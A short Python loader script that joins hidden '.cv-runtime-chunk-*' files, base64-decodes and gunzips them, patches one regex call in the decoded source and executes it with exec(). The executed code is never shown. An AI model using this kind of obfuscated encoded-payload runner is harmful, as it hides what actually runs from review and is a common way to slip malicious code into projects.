from pathlib import Path
import base64
import gzip

root = Path(__file__).parent
payload = "".join(
    path.read_text(encoding="ascii")
    for path in sorted(root.glob(".cv-runtime-chunk-*"))
)
source = gzip.decompress(base64.b64decode(payload))
source = source.replace(
    b"controller_pattern.subn(controller_replacement, js, count=1)",
    b"controller_pattern.subn(lambda _: controller_replacement, js, count=1)",
)
exec(compile(source, __file__, "exec"))
